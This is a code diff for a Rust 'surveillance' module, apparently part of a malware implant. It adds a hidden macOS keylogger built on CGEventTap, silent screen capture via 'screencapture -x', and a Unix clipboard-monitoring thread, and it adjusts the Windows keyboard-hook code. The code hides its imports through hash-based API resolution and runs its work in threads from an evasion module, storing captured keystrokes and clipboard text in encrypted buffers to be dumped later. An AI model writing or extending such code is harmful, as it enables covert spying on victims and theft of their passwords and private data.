@@ -4,8 +4,9 @@
 //! `surveillance` feature flag:
 //!
 //! - **Screenshot**: BitBlt-based screen capture with PNG encoding (Windows),
-//!   X11/fb0 fallback (Linux), CGWindowListCreateImage (macOS).
-//! - **Keylogger**: `SetWindowsHookExW(WH_KEYBOARD_LL)` on Windows.  Keystrokes
+//!   X11/fb0 fallback (Linux), remote-assist or `screencapture` (macOS).
+//! - **Keylogger**: `SetWindowsHookExW(WH_KEYBOARD_LL)` on Windows and
+//!   `CGEventTap` on macOS. Keystrokes
 //!   are buffered in an encrypted ring buffer (ChaCha20-Poly1305) and can be
 //!   dumped on demand.
 //! - **Clipboard monitor**: Background polling thread that captures clipboard
@@ -24,7 +25,11 @@ use anyhow::{anyhow, Result};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
 use lazy_static::lazy_static;
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+#[cfg(target_os = "macos")]
+use std::ffi::c_void;
+#[cfg(target_os = "windows")]
+use std::sync::atomic::AtomicU64;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
 
 // ── pe_resolve helpers ────────────────────────────────────────────────────────
@@ -46,8 +51,8 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
         None => {
             let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
                 resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
-            let m = load_library_w(dll_wide.as_ptr());
-            if m.is_null() {
+            let m = load_library_w(dll_wide.as_ptr()) as usize;
+            if m == 0 {
                 return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
             }
             m
@@ -88,13 +93,18 @@ const HASH_GETMODULEHANDLEW: u32           = hash_str_const(b"GetModuleHandleW\0
 type FnGetDC                      = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
 type FnReleaseDC                  = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
 type FnGetSystemMetrics           = unsafe extern "system" fn(i32) -> i32;
-type FnGetMonitorInfoW            = unsafe extern "system" fn(*mut std::ffi::c_void, *mut crate::win_types::MONITORINFO) -> i32;
-type FnEnumDisplayMonitors        = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut crate::win_types::RECT, std::ffi::c_long) -> i32>, std::ffi::c_long) -> i32;
-type FnSetWindowsHookExW          = unsafe extern "system" fn(i32, Option<unsafe extern "system" fn(i32, usize, usize) -> usize>, *mut std::ffi::c_void, u32) -> *mut std::ffi::c_void;
-type FnCallNextHookEx             = unsafe extern "system" fn(*mut std::ffi::c_void, i32, usize, usize) -> usize;
-type FnPeekMessageW               = unsafe extern "system" fn(*mut crate::win_types::MSG, *mut std::ffi::c_void, u32, u32, u32) -> i32;
-type FnTranslateMessage           = unsafe extern "system" fn(*const crate::win_types::MSG) -> i32;
-type FnDispatchMessageW           = unsafe extern "system" fn(*const crate::win_types::MSG) -> usize;
+#[cfg(target_os = "windows")]
+type FnGetMonitorInfoW            = unsafe extern "system" fn(crate::win_types::HMONITOR, *mut crate::win_types::MONITORINFO) -> crate::win_types::BOOL;
+#[cfg(target_os = "windows")]
+type FnEnumDisplayMonitors        = unsafe extern "system" fn(crate::win_types::HDC, *mut std::ffi::c_void, Option<unsafe extern "system" fn(crate::win_types::HMONITOR, crate::win_types::HDC, crate::win_types::LPRECT, crate::win_types::LPARAM) -> crate::win_types::BOOL>, crate::win_types::LPARAM) -> crate::win_types::BOOL;
+type FnSetWindowsHookExW          = unsafe extern "system" fn(i32, Option<unsafe extern "system" fn(i32, usize, isize) -> isize>, *mut std::ffi::c_void, u32) -> *mut std::ffi::c_void;
+type FnCallNextHookEx             = unsafe extern "system" fn(*mut std::ffi::c_void, i32, usize, isize) -> isize;
+#[cfg(target_os = "windows")]
+type FnPeekMessageW               = unsafe extern "system" fn(*mut crate::win_types::MSG, *mut std::ffi::c_void, u32, u32, u32) -> crate::win_types::BOOL;
+#[cfg(target_os = "windows")]
+type FnTranslateMessage           = unsafe extern "system" fn(*const crate::win_types::MSG) -> crate::win_types::BOOL;
+#[cfg(target_os = "windows")]
+type FnDispatchMessageW           = unsafe extern "system" fn(*const crate::win_types::MSG) -> crate::win_types::LRESULT;
 type FnUnhookWindowsHookEx        = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnGetClipboardSequenceNumber = unsafe extern "system" fn() -> u32;
 type FnOpenClipboard              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
@@ -122,6 +132,7 @@ type FnCreateCompatibleBitmap = unsafe extern "system" fn(*mut std::ffi::c_void,
 type FnCreateCompatibleDC    = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
 type FnDeleteDC              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnDeleteObject          = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+#[cfg(target_os = "windows")]
 type FnGetDIBits             = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void, *mut crate::win_types::BITMAPINFO, u32) -> i32;
 type FnSelectObject          = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
 
@@ -133,6 +144,66 @@ const PM_REMOVE: u32         = 0x0001;
 const CF_UNICODETEXT: u32    = 13;
 const CF_TEXT: u32           = 1;
 const WM_QUIT: u32           = 0x0012;
+
+// ── macOS keylogger FFI types/constants ─────────────────────────────────────
+#[cfg(target_os = "macos")]
+type CFMachPortRef = *mut c_void;
+#[cfg(target_os = "macos")]
+type CFRunLoopSourceRef = *mut c_void;
+#[cfg(target_os = "macos")]
+type CFRunLoopRef = *mut c_void;
+#[cfg(target_os = "macos")]
+type CGEventTapProxy = *mut c_void;
+#[cfg(target_os = "macos")]
+type CGEventType = u32;
+#[cfg(target_os = "macos")]
+type CGEventRef = *mut c_void;
+#[cfg(target_os = "macos")]
+type CGEventTapCallback =
+    extern "C" fn(CGEventTapProxy, CGEventType, CGEventRef, *mut c_void) -> CGEventRef;
+
+#[cfg(target_os = "macos")]
+const KCG_SESSION_EVENT_TAP: u32 = 1;
+#[cfg(target_os = "macos")]
+const KCG_HEAD_INSERT_EVENT_TAP: u32 = 0;
+#[cfg(target_os = "macos")]
+const KCG_EVENT_TAP_OPTION_LISTEN_ONLY: u32 = 1;
+#[cfg(target_os = "macos")]
+const KCG_EVENT_KEYDOWN: u32 = 10;
+#[cfg(target_os = "macos")]
+const KCG_EVENT_KEYUP: u32 = 11;
+#[cfg(target_os = "macos")]
+const KCG_KEYBOARD_EVENT_KEYCODE: i32 = 9;
+
+#[cfg(target_os = "macos")]
+#[link(name = "ApplicationServices", kind = "framework")]
+unsafe extern "C" {
+    fn AXIsProcessTrusted() -> bool;
+    fn CGEventTapCreate(
+        tap: u32,
+        place: u32,
+        options: u32,
+        events_of_interest: u64,
+        callback: CGEventTapCallback,
+        user_info: *mut c_void,
+    ) -> CFMachPortRef;
+    fn CGEventGetIntegerValueField(event: CGEventRef, field: i32) -> i64;
+}
+
+#[cfg(target_os = "macos")]
+#[link(name = "CoreFoundation", kind = "framework")]
+unsafe extern "C" {
+    fn CFMachPortCreateRunLoopSource(
+        alloc: *const c_void,
+        port: CFMachPortRef,
+        order: isize,
+    ) -> CFRunLoopSourceRef;
+    fn CFRunLoopGetCurrent() -> CFRunLoopRef;
+    fn CFRunLoopAddSource(rl: CFRunLoopRef, source: CFRunLoopSourceRef, mode: *const c_void);
+    fn CFRunLoopRun();
+    fn CFRelease(cf: *const c_void);
+    static kCFRunLoopCommonModes: *const c_void;
+}
 
 // ── Constants ──────────────────────────────────────────────────────────────────
 
@@ -153,6 +224,17 @@ lazy_static! {
     static ref CLIPBOARD_STATE: Arc<Mutex<Option<ClipboardState>>> =
         Arc::new(Mutex::new(None));
 }
+
+#[cfg(target_os = "macos")]
+lazy_static! {
+    static ref MAC_KEYLOGGER_BUFFER: Mutex<Option<Arc<Mutex<EncryptedBuffer>>>> =
+        Mutex::new(None);
+}
+
+#[cfg(target_os = "macos")]
+static MAC_KEYLOGGER_ACTIVE: AtomicBool = AtomicBool::new(false);
+#[cfg(target_os = "macos")]
+static MAC_KEYLOGGER_LISTENER_STARTED: AtomicBool = AtomicBool::new(false);
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // Screenshot
@@ -316,7 +398,10 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
         .ok_or_else(|| anyhow!("failed to construct image buffer"))?;
 
         let mut png_buf: Vec<u8> = Vec::new();
-        img.write_to(&mut Cursor::new(&mut png_buf), image::ImageFormat::Png)?;
+        img.write_to(
+            &mut std::io::Cursor::new(&mut png_buf),
+            image::ImageFormat::Png,
+        )?;
         Ok(png_buf)
     }
 }
@@ -421,9 +506,38 @@ fn capture_screenshot_macos() -> Result<Vec<u8>> {
             Err(e) => log::warn!("macOS screenshot via remote_assist failed: {}", e),
         }
     }
-    Err(anyhow!(
-        "screenshot capture on macOS requires the remote-assist feature"
-    ))
+
+    let mut out_path = std::env::temp_dir();
+    let nonce: u64 = rand::random();
+    out_path.push(format!(
+        ".orchestra-screen-{}-{}.png",
+        std::process::id(),
+        nonce
+    ));
+
+    let output = std::process::Command::new("screencapture")
+        .args(["-x", "-t", "png"])
+        .arg(&out_path)
+        .output()
+        .map_err(|e| anyhow!("failed to start screencapture: {}", e))?;
+
+    if !output.status.success() {
+        let _ = std::fs::remove_file(&out_path);
+        return Err(anyhow!(
+            "screencapture failed: {}",
+            String::from_utf8_lossy(&output.stderr).trim()
+        ));
+    }
+
+    let png = std::fs::read(&out_path)
+        .map_err(|e| anyhow!("failed to read screencapture output: {}", e))?;
+    let _ = std::fs::remove_file(&out_path);
+
+    if png.is_empty() {
+        return Err(anyhow!("screencapture produced empty output"));
+    }
+
+    Ok(png)
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -442,36 +556,70 @@ struct KeyloggerState {
 /// Start the keylogger.  `key` is the 32-byte ChaCha20-Poly1305 key used to
 /// encrypt the keystroke buffer.
 pub fn start_keylogger(key: [u8; 32]) -> Result<()> {
+    #[allow(unused_mut)]
     let mut guard = KEYLOGGER_STATE.lock().unwrap();
     if guard.is_some() {
         return Err(anyhow!("keylogger already running"));
     }
 
-    let running = Arc::new(AtomicBool::new(true));
-    let buffer = Arc::new(Mutex::new(EncryptedBuffer::new(key)));
+    #[cfg(target_os = "macos")]
+    {
+        if unsafe { !AXIsProcessTrusted() } {
+            log::warn!(
+                "surveillance: macOS Accessibility permission is not granted; key capture may fail"
+            );
+        }
+
+        let running = Arc::new(AtomicBool::new(true));
+        let buffer = Arc::new(Mutex::new(EncryptedBuffer::new(key)));
+
+        MAC_KEYLOGGER_ACTIVE.store(true, Ordering::SeqCst);
+        if let Ok(mut slot) = MAC_KEYLOGGER_BUFFER.lock() {
+            *slot = Some(Arc::clone(&buffer));
+        }
+        if !MAC_KEYLOGGER_LISTENER_STARTED.swap(true, Ordering::SeqCst) {
+            start_keylogger_thread_macos();
+        }
+
+        *guard = Some(KeyloggerState {
+            buffer,
+            running,
+            thread_handle: None,
+        });
+
+        return Ok(());
+    }
+
+    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
+    {
+        let _ = key;
+        log::warn!(
+            "surveillance: keylogger not implemented on this platform"
+        );
+        return Err(anyhow!(
+            "keylogger is not supported on this platform"
+        ));
+    }
 
     #[cfg(target_os = "windows")]
-    let thread_handle = {
-        let buffer_clone = Arc::clone(&buffer);
-        let running_clone = running.clone();
-        Some(start_keylogger_thread_windows(buffer_clone, running_clone))
-    };
+    {
+        let running = Arc::new(AtomicBool::new(true));
+        let buffer = Arc::new(Mutex::new(EncryptedBuffer::new(key)));
 
-    #[cfg(not(target_os = "windows"))]
-    let thread_handle: Option<std::thread::JoinHandle<()>> = {
-        log::warn!(
-            "surveillance: keylogger not yet fully implemented on this platform"
-        );
-        None
-    };
+        let thread_handle = {
+            let buffer_clone = Arc::clone(&buffer);
+            let running_clone = running.clone();
+            Some(start_keylogger_thread_windows(buffer_clone, running_clone))
+        };
 
-    *guard = Some(KeyloggerState {
-        buffer,
-        running,
-        thread_handle,
-    });
+        *guard = Some(KeyloggerState {
+            buffer,
+            running,
+            thread_handle,
+        });
 
-    Ok(())
+        Ok(())
+    }
 }
 
 /// Dump the current keylogger buffer.  If `clear` is true the buffer is
@@ -493,6 +641,15 @@ pub fn stop_keylogger() -> Result<()> {
     match guard.take() {
         Some(mut state) => {
             state.running.store(false, Ordering::SeqCst);
+
+            #[cfg(target_os = "macos")]
+            {
+                MAC_KEYLOGGER_ACTIVE.store(false, Ordering::SeqCst);
+                if let Ok(mut slot) = MAC_KEYLOGGER_BUFFER.lock() {
+                    *slot = None;
+                }
+            }
+
             if let Some(handle) = state.thread_handle.take() {
                 let _ = handle.join();
             }
@@ -509,6 +666,12 @@ pub fn pause_keylogger() -> Result<()> {
     match guard.as_ref() {
         Some(state) => {
             state.running.store(false, Ordering::SeqCst);
+
+            #[cfg(target_os = "macos")]
+            {
+                MAC_KEYLOGGER_ACTIVE.store(false, Ordering::SeqCst);
+            }
+
             Ok(())
         }
         None => Err(anyhow!("keylogger not running")),
@@ -521,10 +684,103 @@ pub fn resume_keylogger() -> Result<()> {
     match guard.as_ref() {
         Some(state) => {
             state.running.store(true, Ordering::SeqCst);
+
+            #[cfg(target_os = "macos")]
+            {
+                if let Ok(mut slot) = MAC_KEYLOGGER_BUFFER.lock() {
+                    *slot = Some(Arc::clone(&state.buffer));
+                }
+                MAC_KEYLOGGER_ACTIVE.store(true, Ordering::SeqCst);
+                if !MAC_KEYLOGGER_LISTENER_STARTED.swap(true, Ordering::SeqCst) {
+                    start_keylogger_thread_macos();
+                }
+            }
+
             Ok(())
         }
         None => Err(anyhow!("keylogger not running")),
     }
+}
+
+#[cfg(target_os = "macos")]
+fn start_keylogger_thread_macos() {
+    crate::evasion::spawn_hidden_thread(move || {
+        extern "C" fn keyboard_tap_callback(
+            _proxy: CGEventTapProxy,
+            event_type: CGEventType,
+            event: CGEventRef,
+            _user_info: *mut c_void,
+        ) -> CGEventRef {
+            if event.is_null() {
+                return event;
+            }
+            if event_type != KCG_EVENT_KEYDOWN && event_type != KCG_EVENT_KEYUP {
+                return event;
+            }
+            if !MAC_KEYLOGGER_ACTIVE.load(Ordering::Relaxed) {
+                return event;
+            }
+
+            let key_code = unsafe { CGEventGetIntegerValueField(event, KCG_KEYBOARD_EVENT_KEYCODE) };
+            let pressed = event_type == KCG_EVENT_KEYDOWN;
+            let ts = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_millis();
+            let entry = format!(
+                "[{}] {} {}\n",
+                ts,
+                if pressed { "down" } else { "up" },
+                key_code
+            );
+
+            if let Ok(slot) = MAC_KEYLOGGER_BUFFER.lock() {
+                if let Some(buf) = slot.as_ref() {
+                    if let Ok(mut guard) = buf.lock() {
+                        let _ = guard.append(entry.as_bytes());
+                    }
+                }
+            }
+
+            event
+        }
+
+        unsafe {
+            let event_mask = (1u64 << KCG_EVENT_KEYDOWN) | (1u64 << KCG_EVENT_KEYUP);
+            let tap = CGEventTapCreate(
+                KCG_SESSION_EVENT_TAP,
+                KCG_HEAD_INSERT_EVENT_TAP,
+                KCG_EVENT_TAP_OPTION_LISTEN_ONLY,
+                event_mask,
+                keyboard_tap_callback,
+                std::ptr::null_mut(),
+            );
+
+            if tap.is_null() {
+                log::error!(
+                    "surveillance: CGEventTapCreate failed; Accessibility permission may be missing"
+                );
+                MAC_KEYLOGGER_LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+
+            let run_loop = CFRunLoopGetCurrent();
+            let source = CFMachPortCreateRunLoopSource(std::ptr::null(), tap, 0);
+            if source.is_null() {
+                log::error!("surveillance: failed to create CFRunLoop source for keylogger");
+                CFRelease(tap as *const c_void);
+                MAC_KEYLOGGER_LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+
+            CFRunLoopAddSource(run_loop, source, kCFRunLoopCommonModes);
+            CFRelease(source as *const c_void);
+            CFRunLoopRun();
+            CFRelease(tap as *const c_void);
+        }
+
+        MAC_KEYLOGGER_LISTENER_STARTED.store(false, Ordering::SeqCst);
+    });
 }
 
 // ── Windows keylogger thread ────────────────────────────────────────────────
@@ -716,40 +972,61 @@ pub fn start_clipboard_monitor(key: [u8; 32], interval_ms: Option<u64>) -> Resul
         return Err(anyhow!("clipboard monitor already running"));
     }
 
-    let running = Arc::new(AtomicBool::new(true));
-    let buffer = Arc::new(Mutex::new(EncryptedBuffer::with_capacity(
-        CLIPBOARD_MAX_BUFFER,
-        key,
-    )));
-    let interval = interval_ms.unwrap_or(DEFAULT_CLIPBOARD_INTERVAL_MS);
-
     #[cfg(target_os = "windows")]
-    let thread_handle = {
-        let buffer_clone = Arc::clone(&buffer);
-        let running_clone = running.clone();
-        Some(start_clipboard_thread_windows(
-            buffer_clone,
-            running_clone,
-            interval,
-        ))
-    };
+    {
+        let running = Arc::new(AtomicBool::new(true));
+        let buffer = Arc::new(Mutex::new(EncryptedBuffer::with_capacity(
+            CLIPBOARD_MAX_BUFFER,
+            key,
+        )));
+        let interval = interval_ms.unwrap_or(DEFAULT_CLIPBOARD_INTERVAL_MS);
+
+        let thread_handle = {
+            let buffer_clone = Arc::clone(&buffer);
+            let running_clone = running.clone();
+            Some(start_clipboard_thread_windows(
+                buffer_clone,
+                running_clone,
+                interval,
+            ))
+        };
+
+        *guard = Some(ClipboardState {
+            buffer,
+            running,
+            thread_handle,
+        });
+
+        Ok(())
+    }
 
     #[cfg(not(target_os = "windows"))]
-    let thread_handle: Option<std::thread::JoinHandle<()>> = {
-        let _ = interval;
-        log::warn!(
-            "surveillance: clipboard monitor not yet fully implemented on this platform"
-        );
-        None
-    };
+    {
+        let running = Arc::new(AtomicBool::new(true));
+        let buffer = Arc::new(Mutex::new(EncryptedBuffer::with_capacity(
+            CLIPBOARD_MAX_BUFFER,
+            key,
+        )));
+        let interval = interval_ms.unwrap_or(DEFAULT_CLIPBOARD_INTERVAL_MS);
 
-    *guard = Some(ClipboardState {
-        buffer,
-        running,
-        thread_handle,
-    });
+        let thread_handle = {
+            let buffer_clone = Arc::clone(&buffer);
+            let running_clone = running.clone();
+            Some(start_clipboard_thread_unix(
+                buffer_clone,
+                running_clone,
+                interval,
+            ))
+        };
 
-    Ok(())
+        *guard = Some(ClipboardState {
+            buffer,
+            running,
+            thread_handle,
+        });
+
+        Ok(())
+    }
 }
 
 /// Dump the current clipboard monitor buffer.  If `clear` is true the buffer
@@ -835,6 +1112,44 @@ fn start_clipboard_thread_windows(
                         let entry = format!("[{}] {}\n", ts, text);
                         let _ = guard.append(entry.as_bytes());
                     }
+                }
+            }
+        }
+    })
+}
+
+#[cfg(not(target_os = "windows"))]
+fn start_clipboard_thread_unix(
+    buffer: Arc<Mutex<EncryptedBuffer>>,
+    running: Arc<AtomicBool>,
+    interval_ms: u64,
+) -> std::thread::JoinHandle<()> {
+    crate::evasion::spawn_hidden_thread(move || {
+        let mut last_text: Option<String> = None;
+
+        while running.load(Ordering::SeqCst) {
+            std::thread::sleep(std::time::Duration::from_millis(interval_ms));
+
+            if !running.load(Ordering::SeqCst) {
+                break;
+            }
+
+            if let Ok(text) = get_clipboard_unix() {
+                if text.is_empty() {
+                    continue;
+                }
+                if last_text.as_ref().is_some_and(|prev| prev == &text) {
+                    continue;
+                }
+                last_text = Some(text.clone());
+
+                if let Ok(mut guard) = buffer.lock() {
+                    let ts = std::time::SystemTime::now()
+                        .duration_since(std::time::UNIX_EPOCH)
+                        .unwrap_or_default()
+                        .as_millis();
+                    let entry = format!("[{}] {}\n", ts, text);
+                    let _ = guard.append(entry.as_bytes());
                 }
             }
         }
